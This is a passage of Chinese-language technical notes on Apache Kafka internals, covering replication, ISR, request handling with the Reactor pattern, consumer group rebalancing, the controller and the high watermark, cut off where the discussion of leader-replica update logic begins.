<p>C ：Kafka JMX监控指标<br>使用Kafka默认提供 的JMX监控指标来监控消费者的Lag值。<br>（1）Kafka消费者提供了一个名为Kafka.consumer:type=consumer-fetch-manager-metrics，client-id=”{client-id}”的JMX指标。<br>（2）有两个重要的属性：records-lag-max 和 records-lead-min 分别表示消费者在测试窗口时间内曾经达到的最大的Lag值和最小的Lead值。<br>（3）Lead值是指消费者最新消费消息的位移和分区当前第一条消息的位移的差值。即：Lag越大，Lead就越小。</p>
<h2 id="深入Kafka内核"><a href="#深入Kafka内核" class="headerlink" title="深入Kafka内核"></a>深入Kafka内核</h2><h3 id="Kafka副本机制详解"><a href="#Kafka副本机制详解" class="headerlink" title="Kafka副本机制详解"></a>Kafka副本机制详解</h3><p>所谓的副本机制（Replication），也可以称之为备份机制，通常是指分布式系统在多台网络互联的机器上保存有相同的数据拷贝。</p>
<p>副本机制有什么好处呢？</p>
<ul>
<li>提供数据冗余。即使系统部分组件失效，系统依然能够继续运转，因而增加了整体可用性以及数据持久性。</li>
<li>提供高伸缩性。支持横向扩展，能够通过增加机器的方式来提升读性能，进而提高读操作吞吐量。</li>
<li>改善数据局部性。允许将数据放入与用户地理位置相近的地方，从而降低系统延时。</li>
</ul>
<p>这些优点都是在分布式系统教科书中最常被提及的，但是有些遗憾的是，对于 Apache Kafka 而言，目前只能享受到副本机制带来的第 1 个好处，也就是提供数据冗余实现高可用性和高持久性。</p>
<h4 id="副本定义"><a href="#副本定义" class="headerlink" title="副本定义"></a>副本定义</h4><p>所谓副本（Replica），本质就是一个只能追加写消息的提交日志。根据 Kafka 副本机制的定义，同一个分区下的所有副本保存有相同的消息序列，这些副本分散保存在不同的 Broker 上，从而能够对抗部分 Broker 宕机带来的数据不可用。</p>
<p><img src="https://static001.geekbang.org/resource/image/3b/77/3b5f28c6d19b2c6fe592b2b78d3ebc77.jpg"></p>
<h4 id="副本角色"><a href="#副本角色" class="headerlink" title="副本角色"></a>副本角色</h4><p>既然分区下能够配置多个副本，而且这些副本的内容还要一致，那么很自然的一个问题就是：我们该如何确保副本中所有的数据都是一致的呢？特别是对 Kafka 而言，当生产者发送消息到某个主题后，消息是如何同步到对应的所有副本中的呢？针对这个问题，最常见的解决方案就是采用基于领导者（Leader-based）的副本机制。Apache Kafka 就是这样的设计。</p>
<p><img src="https://static001.geekbang.org/resource/image/38/c2/381eda4b56991d52727934be7c7e6ec2.jpg"></p>
<p>第一，在 Kafka 中，副本分成两类：领导者副本（Leader Replica）和追随者副本（Follower Replica）。每个分区在创建时都要选举一个副本，称为领导者副本，其余的副本自动称为追随者副本。</p>
<p>第二，Kafka 的副本机制比其他分布式系统要更严格一些。在 Kafka 中，追随者副本是不对外提供服务的。这就是说，任何一个追随者副本都不能响应消费者和生产者的读写请求。所有的请求都必须由领导者副本来处理，或者说，所有的读写请求都必须发往领导者副本所在的 Broker，由该 Broker 负责处理。追随者副本不处理客户端请求，它唯一的任务就是从领导者副本异步拉取消息，并写入到自己的提交日志中，从而实现与领导者副本的同步。</p>
<p>第三，当领导者副本挂掉了，或者说领导者副本所在的 Broker 宕机时，Kafka 依托于 ZooKeeper 提供的监控功能能够实时感知到，并立即开启新一轮的领导者选举，从追随者副本中选一个作为新的领导者。老 Leader 副本重启回来后，只能作为追随者副本加入到集群中。</p>
<h5 id="1-方便实现“Read-your-writes”"><a href="#1-方便实现“Read-your-writes”" class="headerlink" title="1.方便实现“Read-your-writes”"></a>1.方便实现“Read-your-writes”</h5><p>所谓 Read-your-writes，顾名思义就是，当你使用生产者 API 向 Kafka 成功写入消息后，马上使用消费者 API 去读取刚才生产的消息。</p>
<p>举个例子，比如你平时发微博时，你发完一条微博，肯定是希望能立即看到的，这就是典型的 Read-your-writes 场景。如果允许追随者副本对外提供服务，由于副本同步是异步的，因此有可能出现追随者副本还没有从领导者副本那里拉取到最新的消息，从而使得客户端看不到最新写入的消息。</p>
<h5 id="2-方便实现单调读（Monotonic-Reads）"><a href="#2-方便实现单调读（Monotonic-Reads）" class="headerlink" title="2.方便实现单调读（Monotonic Reads）"></a>2.方便实现单调读（Monotonic Reads）</h5><p>就是对于一个消费者用户而言，在多次消费消息时，它不会看到某条消息一会儿存在一会儿不存在。</p>
<p>如果允许追随者副本提供读服务，那么假设当前有 2 个追随者副本 F1 和 F2，它们异步地拉取领导者副本数据。倘若 F1 拉取了 Leader 的最新消息而 F2 还未及时拉取，那么，此时如果有一个消费者先从 F1 读取消息之后又从 F2 拉取消息，它可能会看到这样的现象：第一次消费时看到的最新消息在第二次消费时不见了，这就不是单调读一致性。但是，如果所有的读请求都是由 Leader 来处理，那么 Kafka 就很容易实现单调读一致性。</p>
<h4 id="In-sync-Replicas（ISR）"><a href="#In-sync-Replicas（ISR）" class="headerlink" title="In-sync Replicas（ISR）"></a>In-sync Replicas（ISR）</h4><p>ISR 中的副本都是与 Leader 同步的副本，相反，不在 ISR 中的追随者副本就被认为是与 Leader 不同步的。</p>
<p>我们首先要明确的是，Leader 副本天然就在 ISR 中。也就是说，ISR 不只是追随者副本集合，它必然包括 Leader 副本。甚至在某些情况下，ISR 只有 Leader 这一个副本。</p>
<p>这个标准就是 Broker 端参数 replica.lag.time.max.ms 参数值。这个参数的含义是 Follower 副本能够落后 Leader 副本的最长时间间隔，当前默认值是 10 秒。这就是说，只要一个 Follower 副本落后 Leader 副本的时间不连续超过 10 秒，那么 Kafka 就认为该 Follower 副本与 Leader 是同步的，即使此时 Follower 副本中保存的消息明显少于 Leader 副本中的消息。</p>
<h4 id="Unclean-领导者选举（Unclean-Leader-Election）"><a href="#Unclean-领导者选举（Unclean-Leader-Election）" class="headerlink" title="Unclean 领导者选举（Unclean Leader Election）"></a>Unclean 领导者选举（Unclean Leader Election）</h4><p>Kafka 把所有不在 ISR 中的存活副本都称为非同步副本。通常来说，非同步副本落后 Leader 太多，因此，如果选择这些副本作为新 Leader，就可能出现数据的丢失。毕竟，这些副本中保存的消息远远落后于老 Leader 中的消息。在 Kafka 中，选举这种副本的过程称为 Unclean 领导者选举。Broker 端参数 unclean.leader.election.enable 控制是否允许 Unclean 领导者选举。</p>
<p>如果你听说过 CAP 理论的话，你一定知道，一个分布式系统通常只能同时满足一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）中的两个。显然，在这个问题上，Kafka 赋予你选择 C 或 A 的权利。</p>
<h3 id="请求是怎么被处理的？"><a href="#请求是怎么被处理的？" class="headerlink" title="请求是怎么被处理的？"></a>请求是怎么被处理的？</h3><p>无论是 Kafka 客户端还是 Broker 端，它们之间的交互都是通过“请求 / 响应”的方式完成的。比如，客户端会通过网络发送消息生产请求给 Broker，而 Broker 处理完成后，会发送对应的响应给到客户端。</p>
<p>Apache Kafka 自己定义了一组请求协议，用于实现各种各样的交互操作。比如常见的 PRODUCE 请求是用于生产消息的，FETCH 请求是用于消费消息的，METADATA 请求是用于请求 Kafka 集群元数据信息的。</p>
<h4 id="处理请求的-2-种常见方案"><a href="#处理请求的-2-种常见方案" class="headerlink" title="处理请求的 2 种常见方案"></a>处理请求的 2 种常见方案</h4><h5 id="1-顺序处理请求"><a href="#1-顺序处理请求" class="headerlink" title="1.顺序处理请求"></a>1.顺序处理请求</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Request request = accept(connection);</span><br><span class="line">            handle(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法实现简单，但是有个致命的缺陷，那就是吞吐量太差。由于只能顺序处理每个请求，因此，每个请求都必须等待前一个请求处理完毕才能得到处理。这种方式只适用于请求发送非常不频繁的系统。</p>
<h5 id="2-每个请求使用单独线程处理"><a href="#2-每个请求使用单独线程处理" class="headerlink" title="2.每个请求使用单独线程处理"></a>2.每个请求使用单独线程处理</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Request = request = accept(connection);</span><br><span class="line">            Thread thread = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">  handle(request);&#125;);</span><br><span class="line">            thread.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法反其道而行之，完全采用异步的方式。系统会为每个入站请求都创建单独的线程来处理。这个方法的好处是，它是完全异步的，每个请求的处理都不会阻塞下一个请求。但缺陷也同样明显。为每个请求都创建线程的做法开销极大，在某些场景下甚至会压垮整个服务。还是那句话，这个方法只适用于请求发送频率很低的业务场景。</p>
<p>既然这两种方案都不好，那么，Kafka 是如何处理请求的呢？用一句话概括就是，Kafka 使用的是 Reactor 模式。</p>
<h4 id="Kafka-是如何处理请求的？"><a href="#Kafka-是如何处理请求的？" class="headerlink" title="Kafka 是如何处理请求的？"></a>Kafka 是如何处理请求的？</h4><p>简单来说，Reactor 模式是事件驱动架构的一种实现方式，特别适合应用于处理多个客户端并发向服务器端发送请求的场景。我借用 Doug Lea 的一页 PPT 来说明一下 Reactor 的架构，并借此引出 Kafka 的请求处理模型。</p>
<p><img src="https://static001.geekbang.org/resource/image/5b/3c/5bf8e3e8d35d1ac62yydb092700b683c.jpg?wh=3770*1801"></p>
<p>从这张图中，我们可以发现，多个客户端会发送请求给到 Reactor。Reactor 有个请求分发线程 Dispatcher，也就是图中的 Acceptor，它会将不同的请求下发到多个工作线程中处理。</p>
<p>在这个架构中，Acceptor 线程只是用于请求分发，不涉及具体的逻辑处理，非常得轻量级，因此有很高的吞吐量表现。而这些工作线程可以根据实际业务处理需要任意增减，从而动态调节系统负载能力。</p>
<p>如果我们来为 Kafka 画一张类似的图的话，那它应该是这个样子的：</p>
<p><img src="https://static001.geekbang.org/resource/image/b3/81/b3yy7c6ca1c6244f3f9d2268209a9081.jpg?wh=3618*1716"></p>
<p>显然，这两张图长得差不多。Kafka 的 Broker 端有个 SocketServer 组件，类似于 Reactor 模式中的 Dispatcher，它也有对应的 Acceptor 线程和一个工作线程池，只不过在 Kafka 中，这个工作线程池有个专属的名字，叫网络线程池。Kafka 提供了 Broker 端参数 num.network.threads，用于调整该网络线程池的线程数。其默认值是 3，表示每台 Broker 启动时会创建 3 个网络线程，专门处理客户端发送的请求。</p>
<p>Acceptor 线程采用轮询的方式将入站请求公平地发到所有网络线程中，因此，在实际使用过程中，这些线程通常都有相同的几率被分配到待处理请求。这种轮询策略编写简单，同时也避免了请求处理的倾斜，有利于实现较为公平的请求处理调度。</p>
<p><img src="https://static001.geekbang.org/resource/image/41/95/41e0a69ed649f9c5yyea390edcd79a95.jpg?wh=3537*2088"></p>
<p>当网络线程拿到请求后，它不是自己处理，而是将请求放入到一个共享请求队列中。Broker 端还有个 IO 线程池，负责从该队列中取出请求，执行真正的处理。如果是 PRODUCE 生产请求，则将消息写入到底层的磁盘日志中；如果是 FETCH 请求，则从磁盘或页缓存中读取消息。</p>
<p>IO 线程池处中的线程才是执行请求逻辑的线程。Broker 端参数 num.io.threads 控制了这个线程池中的线程数。目前该参数默认值是 8，表示每台 Broker 启动后自动创建 8 个 IO 线程处理请求。你可以根据实际硬件条件设置此线程池的个数。</p>
<p>当 IO 线程处理完请求后，会将生成的响应发送到网络线程池的响应队列中，然后由对应的网络线程负责将 Response 返还给客户端。</p>
<p>请求队列是所有网络线程共享的，而响应队列则是每个网络线程专属的。这么设计的原因就在于，Dispatcher 只是用于请求分发而不负责响应回传，因此只能让每个网络线程自己发送 Response 给客户端，所以这些 Response 也就没必要放在一个公共的地方。</p>
<p>我们再来看看刚刚的那张图，图中有一个叫 Purgatory 的组件，这是 Kafka 中著名的“炼狱”组件。它是用来缓存延时请求（Delayed Request）的。所谓延时请求，就是那些一时未满足条件不能立刻处理的请求。比如设置了 acks=all 的 PRODUCE 请求，一旦设置了 acks=all，那么该请求就必须等待 ISR 中所有副本都接收了消息后才能返回，此时处理该请求的 IO 线程就必须等待其他 Broker 的写入结果。当请求不能立刻处理时，它就会暂存在 Purgatory 中。稍后一旦满足了完成条件，IO 线程会继续处理该请求，并将 Response 放入对应网络线程的响应队列中。</p>
<h4 id="控制类请求和数据类请求分离"><a href="#控制类请求和数据类请求分离" class="headerlink" title="控制类请求和数据类请求分离"></a>控制类请求和数据类请求分离</h4><p>Kafka 社区把 PRODUCE 和 FETCH 这类请求称为数据类请求，把 LeaderAndIsr、StopReplica 这类请求称为控制类请求。细究起来，当前这种一视同仁的处理方式对控制类请求是不合理的。为什么呢？因为控制类请求有这样一种能力：它可以直接令数据类请求失效！</p>
<p>我来举个例子说明一下。假设我们有个主题只有 1 个分区，该分区配置了两个副本，其中 Leader 副本保存在 Broker 0 上，Follower 副本保存在 Broker 1 上。假设 Broker 0 这台机器积压了很多的 PRODUCE 请求，此时你如果使用 Kafka 命令强制将该主题分区的 Leader、Follower 角色互换，那么 Kafka 内部的控制器组件（Controller）会发送 LeaderAndIsr 请求给 Broker 0，显式地告诉它，当前它不再是 Leader，而是 Follower 了，而 Broker 1 上的 Follower 副本因为被选为新的 Leader，因此停止向 Broker 0 拉取消息。</p>
<p>这时，一个尴尬的场面就出现了：如果刚才积压的 PRODUCE 请求都设置了 acks=all，那么这些在 LeaderAndIsr 发送之前的请求就都无法正常完成了。就像前面说的，它们会被暂存在 Purgatory 中不断重试，直到最终请求超时返回给客户端。</p>
<p>设想一下，如果 Kafka 能够优先处理 LeaderAndIsr 请求，Broker 0 就会立刻抛出 NOT_LEADER_FOR_PARTITION 异常，快速地标识这些积压 PRODUCE 请求已失败，这样客户端不用等到 Purgatory 中的请求超时就能立刻感知，从而降低了请求的处理时间。</p>
<p>基于这些问题，社区于 2.3 版本正式实现了数据类请求和控制类请求的分离。其实，在社区推出方案之前，我自己尝试过修改这个设计。</p>
<p>那么，社区是如何解决的呢？很简单，你可以再看一遍今天的第三张图，社区完全拷贝了这张图中的一套组件，实现了两类请求的分离。也就是说，Kafka Broker 启动后，会在后台分别创建两套网络线程池和 IO 线程池的组合，它们分别处理数据类请求和控制类请求。至于所用的 Socket 端口，自然是使用不同的端口了，你需要提供不同的 listeners 配置，显式地指定哪套端口用于处理哪类请求。</p>
<h3 id="消费者组重平衡全流程解析"><a href="#消费者组重平衡全流程解析" class="headerlink" title="消费者组重平衡全流程解析"></a>消费者组重平衡全流程解析</h3><p>它的作用是让组内所有的消费者实例就消费哪些主题分区达成一致。重平衡需要借助 Kafka Broker 端的 Coordinator 组件，在 Coordinator 的帮助下完成整个消费者组的分区重分配。</p>
<h4 id="触发与通知"><a href="#触发与通知" class="headerlink" title="触发与通知"></a>触发与通知</h4><p>重平衡的 3 个触发条件：</p>
<ul>
<li>组成员数量发生变化。</li>
<li>订阅主题数量发生变化。</li>
<li>订阅主题的分区数发生变化。</li>
</ul>
<p>重平衡过程是如何通知到其他消费者实例的？答案就是，靠消费者端的心跳线程（Heartbeat Thread）。</p>
<p>重平衡的通知机制正是通过心跳线程来完成的。当协调者决定开启新一轮重平衡后，它会将“REBALANCE_IN_PROGRESS”封装进心跳请求的响应中，发还给消费者实例。当消费者实例发现心跳响应中包含了“REBALANCE_IN_PROGRESS”，就能立马知道重平衡又开始了，这就是重平衡的通知机制。</p>
<p>费者端参数 heartbeat.interval.ms 的真实用途，我来解释一下。从字面上看，它就是设置了心跳的间隔时间，但这个参数的真正作用是控制重平衡通知的频率。如果你想要消费者实例更迅速地得到通知，那么就可以给这个参数设置一个非常小的值，这样消费者就能更快地感知到重平衡已经开启了。</p>
<h4 id="消费者组状态机"><a href="#消费者组状态机" class="headerlink" title="消费者组状态机"></a>消费者组状态机</h4><p>重平衡一旦开启，Broker 端的协调者组件就要开始忙了，主要涉及到控制消费者组的状态流转。当前，Kafka 设计了一套消费者组状态机（State Machine），来帮助协调者完成整个重平衡流程。严格来说，这套状态机属于非常底层的设计，Kafka 官网上压根就没有提到过，但你最好还是了解一下，因为它能够帮助你搞懂消费者组的设计原理，比如消费者组的过期位移（Expired Offsets）删除等。</p>
<p>目前，Kafka 为消费者组定义了 5 种状态，它们分别是：Empty、Dead、PreparingRebalance、CompletingRebalance 和 Stable。</p>
<p><img src="https://static001.geekbang.org/resource/image/3c/8b/3c281189cfb1d87173bc2d4b8149f38b.jpeg"></p>
<p>了解了这些状态的含义之后，我们来看一张图片，它展示了状态机的各个状态流转。</p>
<p><img src="https://static001.geekbang.org/resource/image/a9/72/a97eb0e0ee2b97abaf2762b6e79d5b72.jpg"></p>
<p>我来解释一下消费者组启动时的状态流转过程。一个消费者组最开始是 Empty 状态，当重平衡过程开启后，它会被置于 PreparingRebalance 状态等待成员加入，之后变更到 CompletingRebalance 状态等待分配方案，最后流转到 Stable 状态完成重平衡。</p>
<p>当有新成员加入或已有成员退出时，消费者组的状态从 Stable 直接跳到 PreparingRebalance 状态，此时，所有现存成员就必须重新申请加入组。当所有成员都退出组后，消费者组状态变更为 Empty。Kafka 定期自动删除过期位移的条件就是，组要处于 Empty 状态。因此，如果你的消费者组停掉了很长时间（超过 7 天），那么 Kafka 很可能就把该组的位移数据删除了。</p>
<p>Kafka 在尝试定期删除过期位移。现在你知道了，只有 Empty 状态下的组，才会执行过期位移删除的操作。</p>
<h4 id="消费者端重平衡流程"><a href="#消费者端重平衡流程" class="headerlink" title="消费者端重平衡流程"></a>消费者端重平衡流程</h4><p>在消费者端，重平衡分为两个步骤：分别是加入组和等待领导者消费者（Leader Consumer）分配方案。这两个步骤分别对应两类特定的请求：JoinGroup 请求和 SyncGroup 请求。</p>
<p>当组内成员加入组时，它会向协调者发送 JoinGroup 请求。在该请求中，每个成员都要将自己订阅的主题上报，这样协调者就能收集到所有成员的订阅信息。一旦收集了全部成员的 JoinGroup 请求后，协调者会从这些成员中选择一个担任这个消费者组的领导者。</p>
<p>通常情况下，第一个发送 JoinGroup 请求的成员自动成为领导者。你一定要注意区分这里的领导者和之前我们介绍的领导者副本，它们不是一个概念。这里的领导者是具体的消费者实例，它既不是副本，也不是协调者。领导者消费者的任务是收集所有成员的订阅信息，然后根据这些信息，制定具体的分区消费分配方案。</p>
<p>选出领导者之后，协调者会把消费者组订阅信息封装进 JoinGroup 请求的响应体中，然后发给领导者，由领导者统一做出分配方案后，进入到下一步：发送 SyncGroup 请求。</p>
<p>在这一步中，领导者向协调者发送 SyncGroup 请求，将刚刚做出的分配方案发给协调者。值得注意的是，其他成员也会向协调者发送 SyncGroup 请求，只不过请求体中并没有实际的内容。这一步的主要目的是让协调者接收分配方案，然后统一以 SyncGroup 响应的方式分发给所有成员，这样组内所有成员就都知道自己该消费哪些分区了。</p>
<p>JoinGroup 请求的处理过程。</p>
<p><img src="https://static001.geekbang.org/resource/image/33/66/33cff6094ce29ec1111c8cdc817bb266.jpg"></p>
<p>JoinGroup 请求的主要作用是将组成员订阅信息发送给领导者消费者，待领导者制定好分配方案后，重平衡流程进入到 SyncGroup 请求阶段。</p>
<p>SyncGroup 请求的处理流程。</p>
<p><img src="https://static001.geekbang.org/resource/image/84/5b/84b0ffeef5cc382913a4e6cc5a4c675b.jpg"></p>
<p>SyncGroup 请求的主要目的，就是让协调者把领导者制定的分配方案下发给各个组内成员。当所有成员都成功接收到分配方案后，消费者组进入到 Stable 状态，即开始正常的消费工作。</p>
<p>消费者端的重平衡流程我已经介绍完了。接下来，我们从协调者端来看一下重平衡是怎么执行的。</p>
<h4 id="Broker-端重平衡场景剖析"><a href="#Broker-端重平衡场景剖析" class="headerlink" title="Broker 端重平衡场景剖析"></a>Broker 端重平衡场景剖析</h4><p>要剖析协调者端处理重平衡的全流程，我们必须要分几个场景来讨论。这几个场景分别是新成员加入组、组成员主动离组、组成员崩溃离组、组成员提交位移。</p>
<h5 id="场景一：新成员入组。"><a href="#场景一：新成员入组。" class="headerlink" title="场景一：新成员入组。"></a>场景一：新成员入组。</h5><p>新成员入组是指组处于 Stable 状态后，有新成员加入。如果是全新启动一个消费者组，Kafka 是有一些自己的小优化的，流程上会有些许的不同。我们这里讨论的是，组稳定了之后有新成员加入的情形。</p>
<p>当协调者收到新的 JoinGroup 请求后，它会通过心跳请求响应的方式通知组内现有的所有成员，强制它们开启新一轮的重平衡。具体的过程和之前的客户端重平衡流程是一样的。</p>
<p><img src="https://static001.geekbang.org/resource/image/27/7e/2792e00ac3206f63d8036802f4fbd77e.jpg"></p>
<h5 id="场景二：组成员主动离组。"><a href="#场景二：组成员主动离组。" class="headerlink" title="场景二：组成员主动离组。"></a>场景二：组成员主动离组。</h5><p>就是指消费者实例所在线程或进程调用 close() 方法主动通知协调者它要退出。这个场景就涉及到了第三类请求：LeaveGroup 请求。协调者收到 LeaveGroup 请求后，依然会以心跳响应的方式通知其他成员。</p>
<p><img src="https://static001.geekbang.org/resource/image/b0/59/b0d3bc97d7b59a697yy043f1f6b79059.jpg"></p>
<h5 id="场景三：组成员崩溃离组。"><a href="#场景三：组成员崩溃离组。" class="headerlink" title="场景三：组成员崩溃离组。"></a>场景三：组成员崩溃离组。</h5><p>崩溃离组是指消费者实例出现严重故障，突然宕机导致的离组。它和主动离组是有区别的，因为后者是主动发起的离组，协调者能马上感知并处理。但崩溃离组是被动的，协调者通常需要等待一段时间才能感知到，这段时间一般是由消费者端参数 session.timeout.ms 控制的。也就是说，Kafka 一般不会超过 session.timeout.ms 就能感知到这个崩溃。</p>
<p><img src="https://static001.geekbang.org/resource/image/c0/af/c033ea2f7d714fa25eb86e21612e38af.jpg"></p>
<h5 id="场景四：重平衡时协调者对组内成员提交位移的处理。"><a href="#场景四：重平衡时协调者对组内成员提交位移的处理。" class="headerlink" title="场景四：重平衡时协调者对组内成员提交位移的处理。"></a>场景四：重平衡时协调者对组内成员提交位移的处理。</h5><p>正常情况下，每个组内成员都会定期汇报位移给协调者。当重平衡开启时，协调者会给予成员一段缓冲时间，要求每个成员必须在这段时间内快速地上报自己的位移信息，然后再开启正常的 JoinGroup/SyncGroup 请求发送。</p>
<p><img src="https://static001.geekbang.org/resource/image/f6/44/f60a3852e743c0877753141ec5d2d944.jpg"></p>
<h3 id="Kafka控制器"><a href="#Kafka控制器" class="headerlink" title="Kafka控制器"></a>Kafka控制器</h3><p>1作用：<br>控制器组件（Controller），是Apache Kafka的核心组件。它的主要作用是Apache Zookeeper的帮助下管理和协调整个Kafka集群。<br>集群中任意一台Broker都能充当控制器的角色，但在运行过程中，只能有一个Broker成为控制器。</p>
<p>2 特点：控制器是重度依赖Zookeeper。</p>
<p><img src="https://static001.geekbang.org/resource/image/4a/fb/4a2ec3372ff5e4639e5e9c780ec7fcfb.jpg"></p>
<p>3 产生：<br>控制器是被选出来的，Broker在启动时，会尝试去Zookeeper中创建/controller节点。Kafka当前选举控制器的规则是：第一个成功创建/controller节点的Broker会被指定为控制器。</p>
<p>4 功能：<br>A ：主题管理（创建，删除，增加分区）<br>当执行kafka-topics脚本时，大部分的后台工作都是控制器来完成的。<br>B ：分区重分配<br>Kafka-reassign-partitions脚本提供的对已有主题分区进行细粒度的分配功能。<br>C ：Preferred领导者选举<br>Preferred领导者选举主要是Kafka为了避免部分Broker负载过重而提供的一种换Leade的方案。<br>D ：集群成员管理（新增Broker，Broker主动关闭，Broker宕机）<br>控制器组件会利用watch机制检查Zookeeper的/brokers/ids节点下的子节点数量变更。当有新Broker启动后，它会在/brokers下创建专属的znode节点。一旦创建完毕，Zookeeper会通过Watch机制将消息通知推送给控制器，这样，控制器就能自动地感知到这个变化。进而开启后续新增Broker作业。<br>侦测Broker存活性则是依赖于刚刚提到的另一个机制：临时节点。每个Broker启动后，会在/brokers/ids下创建一个临时的znode。当Broker宕机或主机关闭后，该Broker与Zookeeper的会话结束，这个znode会被自动删除。同理，Zookeeper的Watch机制将这一变更推送给控制器，这样控制器就能知道有Broker关闭或宕机了，从而进行善后。</p>
<p>E ：数据服务<br>控制器上保存了最全的集群元数据信息，其他所有Broker会定期接收控制器发来的元数据更新请求，从而更新其内存中的缓存数据。</p>
<p>5 控制器保存的数据</p>
<p><img src="https://static001.geekbang.org/resource/image/21/d4/2174fb81fa7db42122915fee856790d4.jpg"></p>
<p>控制器中保存的这些数据在Zookeeper中也保存了一份。每当控制器初始化时，它都会从Zookeeper上读取对应的元数据并填充到自己的缓存中。</p>
<p>6 控制器故障转移（Failover）<br>故障转移是指：当运行中的控制器突然宕机或意外终止时，Kafka能够快速地感知到，并立即启用备用控制器来替代之前失败的控制器。</p>
<p><img src="https://static001.geekbang.org/resource/image/fb/7d/fb9c538a27253fe069ff7ea2f02fa17d.jpg"></p>
<p>7 内部设计原理<br>A ：控制器的内部设计相当复杂<br>控制器是多线程的设计，会在内部创建很多线程。如：<br>（1）为每个Broker创建一个对应的Socket连接，然后在创建一个专属的线程，用于向这些Broker发送特定的请求。<br>（2）控制连接zookeeper,也会创建单独的线程来处理Watch机制通知回调。<br>（3）控制器还会为主题删除创建额外的I/O线程。<br>这些线程还会访问共享的控制器缓存数据，为了维护数据安全性，控制在代码中大量使用ReetrantLock同步机制，进一步拖慢了整个控制器的处理速度。</p>
<p>B ：在0.11版对控制器的低沉设计进了重构。</p>
<p>（1）最大的改进是：把多线程的方案改成了单线程加事件对列的方案。</p>
<p>a. 单线程+队列的实现方式：社区引入了一个事件处理线程，统一处理各种控制器事件，然后控制器将原来执行的操作全部建模成一个个独立的事件，发送到专属的事件队列中，供此线程消费。<br>b. 单线程不代表之前提到的所有线程都被干掉了，控制器只是把缓存状态变更方面的工作委托给了这个线程而已。<br>（2）第二个改进：将之前同步操作Zookeeper全部改为异步操作。<br>a. Zookeeper本身的API提供了同步写和异步写两种方式。同步操作zk，在有大量主题分区发生变更时，Zookeeper容易成为系统的瓶颈。</p>
<p><img src="https://static001.geekbang.org/resource/image/90/a3/90be543d426a6a450f360ab40e2734a3.jpg"></p>
<h3 id="关于高水位和Leader-Epoch的讨论"><a href="#关于高水位和Leader-Epoch的讨论" class="headerlink" title="关于高水位和Leader Epoch的讨论"></a>关于高水位和Leader Epoch的讨论</h3><p>你可能听说过高水位（High Watermark），但不一定耳闻过 Leader Epoch。前者是 Kafka 中非常重要的概念，而后者是社区在 0.11 版本中新推出的，主要是为了弥补高水位机制的一些缺陷。</p>
<h4 id="什么是高水位？"><a href="#什么是高水位？" class="headerlink" title="什么是高水位？"></a>什么是高水位？</h4><p>教科书中关于水位的经典定义通常是这样的：</p>
<blockquote>
<p>在时刻 T，任意创建时间（Event Time）为 T’，且 T’≤T 的所有事件都已经到达或被观测到，那么 T 就被定义为水位。</p>
</blockquote>
<p><img src="https://static001.geekbang.org/resource/image/84/77/8426888d04e1e9917619829b7e3de877.png"></p>
<p>在 Kafka 的世界中，水位的概念有一点不同。Kafka 的水位不是时间戳，更与时间无关。它是和位置信息绑定的，具体来说，它是用消息位移来表征的。另外，Kafka 源码使用的表述是高水位，因此，今天我也会统一使用“高水位”或它的缩写 HW 来进行讨论。值得注意的是，Kafka 中也有低水位（Low Watermark），它是与 Kafka 删除消息相关联的概念。</p>
<h4 id="高水位的作用"><a href="#高水位的作用" class="headerlink" title="高水位的作用"></a>高水位的作用</h4><ul>
<li>定义消息可见性，即用来标识分区下的哪些消息是可以被消费者消费的。</li>
<li>帮助 Kafka 完成副本同步。</li>
</ul>
<p><img src="https://static001.geekbang.org/resource/image/45/db/453ff803a31aa030feedba27aed17ddb.jpg"></p>
<p>在分区高水位以下的消息被认为是已提交消息，反之就是未提交消息。消费者只能消费已提交消息，即图中位移小于 8 的所有消息。注意，这里我们不讨论 Kafka 事务，因为事务机制会影响消费者所能看到的消息的范围，它不只是简单依赖高水位来判断。它依靠一个名为 LSO（Log Stable Offset）的位移值来判断事务型消费者的可见性。</p>
<p>这也从侧面告诉了我们一个重要的事实，那就是：同一个副本对象，其高水位值不会大于 LEO 值。</p>
<p>高水位和 LEO 是副本对象的两个重要属性。Kafka 所有副本都有对应的高水位和 LEO 值，而不仅仅是 Leader 副本。只不过 Leader 副本比较特殊，Kafka 使用 Leader 副本的高水位来定义所在分区的高水位。换句话说，分区的高水位就是其 Leader 副本的高水位。</p>
<h4 id="高水位更新机制"><a href="#高水位更新机制" class="headerlink" title="高水位更新机制"></a>高水位更新机制</h4><p>每个副本对象都保存了一组高水位值和 LEO 值，但实际上，在 Leader 副本所在的 Broker 上，还保存了其他 Follower 副本的 LEO 值。我们一起来看看下面这张图。</p>
<p><img src="https://static001.geekbang.org/resource/image/8b/de/8b1b8474a568e2ae40bf36bb03ca81de.jpg"></p>
<p>在这张图中，我们可以看到，Broker 0 上保存了某分区的 Leader 副本和所有 Follower 副本的 LEO 值，而 Broker 1 上仅仅保存了该分区的某个 Follower 副本。Kafka 把 Broker 0 上保存的这些 Follower 副本又称为远程副本（Remote Replica）。Kafka 副本机制在运行过程中，会更新 Broker 1 上 Follower 副本的高水位和 LEO 值，同时也会更新 Broker 0 上 Leader 副本的高水位和 LEO 以及所有远程副本的 LEO，但它不会更新远程副本的高水位值，也就是我在图中标记为灰色的部分。</p>
<p>为什么要在 Broker 0 上保存这些远程副本呢？其实，它们的主要作用是，帮助 Leader 副本确定其高水位，也就是分区高水位。</p>
<p>更新机制如下。</p>
<p><img src="https://static001.geekbang.org/resource/image/d6/41/d6d2f98c611e06ffb85f01031ca79b41.jpg"></p>
<p>什么叫与 Leader 副本保持同步。判断的条件有两个。</p>
<ul>
<li>该远程 Follower 副本在 ISR 中。</li>
<li>该远程 Follower 副本 LEO 值落后于 Leader 副本 LEO 值的时间，不超过 Broker 端参数 replica.lag.time.max.ms 的值。如果使用默认值的话，就是不超过 10 秒。</li>
</ul>
<p>我们分别从 Leader 副本和 Follower 副本两个维度，来总结一下高水位和 LEO 的更新机制。</p>
<h5 id="Leader-副本"><a href="#Leader-副本" class="headerlink" title="Leader 副本"></a>Leader 副本</h5><p>处理生产者请求的逻辑如下：</p>
